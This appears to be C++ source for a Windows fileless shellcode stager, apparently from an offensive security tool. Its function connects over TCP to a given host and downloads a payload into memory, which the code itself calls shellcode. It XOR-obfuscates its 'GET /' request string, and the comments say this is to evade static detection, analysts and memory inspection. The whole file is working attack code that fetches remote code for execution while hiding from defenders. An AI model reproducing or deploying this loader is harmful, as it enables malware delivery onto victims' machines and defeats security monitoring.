#include "commun.h"

#define DEFAULT_BUFLEN 10240


DATA getFilelessData(char* host, char* port, char* resource) {

    DATA data = { 0 };
    std::vector<unsigned char> buffer;


    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL, * ptr = NULL, hints;
    char sendbuf[MAX_PATH] = "";

    char get[] = { 0xed, 0xef, 0xfe, 0x8a, 0x85, 0xaa }; // to staticly hide "GET /" from static detection & analyst 
    xor_aa((BYTE*)get, sizeof(get));

    lstrcatA(sendbuf, get);
    xor_aa((BYTE*)get, sizeof(get)); // to hide "GET /" in memory

    lstrcatA(sendbuf, resource);
    xor_aa((BYTE*)resource, sizeof(resource)); // to hide whatever resource string is in memory

    char recvbuf[DEFAULT_BUFLEN]; // receiving 1 kB each ~3s
    memset(recvbuf, 0, DEFAULT_BUFLEN);
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return {0};
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = PF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(host, port, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return {0};
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return {0};
        }

        // Connect to server.
        printf("[+] Connect to %s:%s", host, port);
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return {0};
    }

    // Send an initial buffer
    iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return {0};
    }

    printf("\n[+] Sent %ld Bytes\n", iResult);

    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return {0};
    }

    // Receive until the peer closes the connection
    do {

        iResult = recv(ConnectSocket, (char*)recvbuf, recvbuflen, 0);
        if (iResult > 0)
            printf("[+] Received %d Bytes\n", iResult);
        else if (iResult == 0)
            printf("[+] Connection closed\n");
        else
            printf("recv failed with error: %d\n", WSAGetLastError());

        buffer.insert(buffer.end(), recvbuf, recvbuf + iResult);
        memset(recvbuf, 0, DEFAULT_BUFLEN);
        Sleep(1000);

    } while (iResult > 0);


    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();


    // Received the whole data
    if (buffer.empty() == TRUE)
    {
        printf("Failed in retrieving the Shellcode");
    }

    size_t size = buffer.size();

    char* bufdata = (char*)malloc(size);
    for (int i = 0; i < buffer.size(); i++) {
        bufdata[i] = buffer[i];
    }
    data.data = bufdata;
    data.len = size;
    return data;

}
